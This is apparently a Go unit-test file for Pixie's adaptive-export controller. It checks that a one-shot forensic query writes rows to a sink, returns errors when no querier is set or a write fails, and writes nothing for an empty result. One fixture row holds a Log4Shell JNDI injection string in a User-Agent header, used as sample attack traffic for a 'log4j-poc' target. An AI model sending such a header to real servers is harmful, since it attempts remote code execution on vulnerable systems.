/*
 * Copyright 2018- The Pixie Authors.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 * SPDX-License-Identifier: Apache-2.0
 */

package controller

// Tests for Controller.OrderQuery — the dx→AE /query runner (write⊇read, dx#93):
// a one-shot (target, table, window) capture that queries pixie and writes the
// result through the normal sink, independent of any kubescape-anomaly window.

import (
	"context"
	"errors"
	"sync"
	"testing"
	"time"

	"px.dev/pixie/src/vizier/services/adaptive_export/internal/anomaly"
	"px.dev/pixie/src/vizier/services/adaptive_export/internal/sink"
)

// recordingSink satisfies controller.Sink and records WritePixieRows calls.
type recordingSink struct {
	mu      sync.Mutex
	written map[string]int // table → row count written
	werr    error
}

func newRecordingSink() *recordingSink { return &recordingSink{written: map[string]int{}} }

func (s *recordingSink) Write(context.Context, []sink.AttributionRow) error { return nil }
func (s *recordingSink) QueryActive(context.Context, string) ([]sink.AttributionRow, error) {
	return nil, nil
}
func (s *recordingSink) WritePixieRows(_ context.Context, table string, rows []map[string]any) error {
	if s.werr != nil {
		return s.werr
	}
	s.mu.Lock()
	defer s.mu.Unlock()
	s.written[table] += len(rows)
	return nil
}
func (s *recordingSink) count(table string) int {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.written[table]
}

// stubQuerier returns canned rows (or an error) for any PxL.
type stubQuerier struct {
	rows []map[string]any
	err  error
}

func (q *stubQuerier) Query(context.Context, string) ([]map[string]any, error) {
	return q.rows, q.err
}

func orderQueryCtl(snk Sink, q PixieQuerier) *Controller {
	clk := &fakeClock{t: canonicalEventTime}
	c := New(newFakeTrigger(), snk, defaultCfg(), clk)
	if q != nil {
		c = c.WithPixieQuerier(q)
	}
	return c
}

var oqTarget = anomaly.Target{Namespace: "log4j-poc", Pod: "backend-x", Comm: "java"}

func oqWindow() (time.Time, time.Time) {
	return canonicalEventTime.Add(-time.Minute), canonicalEventTime
}

// A control-ordered query for a table with pixie data writes those rows to the
// sink under that table — this is how the jndi-in-http dx read at triage lands in
// forensic_db even with no kubescape-anomaly window for the pod (dx#93).
func TestOrderQueryWritesRows(t *testing.T) {
	snk := newRecordingSink()
	q := &stubQuerier{rows: []map[string]any{
		{"req_headers": "User-Agent: ${jndi:ldap://x:1389/a}", "req_path": "/api/products"},
	}}
	lo, hi := oqWindow()
	if err := orderQueryCtl(snk, q).OrderQuery(oqTarget, "http_events", lo, hi, "qid-1"); err != nil {
		t.Fatalf("OrderQuery: %v", err)
	}
	if got := snk.count("http_events"); got != 1 {
		t.Errorf("http_events rows written = %d, want 1", got)
	}
}

// With the operator-side querier disabled, OrderQuery errors (so /query 502s) —
// start/stop + dx_attack_graph remain usable.
func TestOrderQueryNoQuerierErrors(t *testing.T) {
	snk := newRecordingSink()
	lo, hi := oqWindow()
	if err := orderQueryCtl(snk, nil).OrderQuery(oqTarget, "http_events", lo, hi, "qid-2"); err == nil {
		t.Error("OrderQuery with no querier should error")
	}
}

// Zero rows → no write, no error (the empty read is still recorded by reconcile).
func TestOrderQueryEmptyNoWrite(t *testing.T) {
	snk := newRecordingSink()
	lo, hi := oqWindow()
	if err := orderQueryCtl(snk, &stubQuerier{rows: nil}).OrderQuery(oqTarget, "conn_stats", lo, hi, "qid-3"); err != nil {
		t.Fatalf("OrderQuery empty: %v", err)
	}
	if got := snk.count("conn_stats"); got != 0 {
		t.Errorf("empty result must not write, got %d rows", got)
	}
}

// A sink write failure surfaces as an OrderQuery error (so /query 502s and dx can
// retry) rather than being silently dropped.
func TestOrderQuerySinkErrorSurfaces(t *testing.T) {
	snk := newRecordingSink()
	snk.werr = errors.New("ch unreachable")
	q := &stubQuerier{rows: []map[string]any{{"x": 1}}}
	lo, hi := oqWindow()
	if err := orderQueryCtl(snk, q).OrderQuery(oqTarget, "http_events", lo, hi, "qid-4"); err == nil {
		t.Error("OrderQuery should surface the sink write error")
	}
}
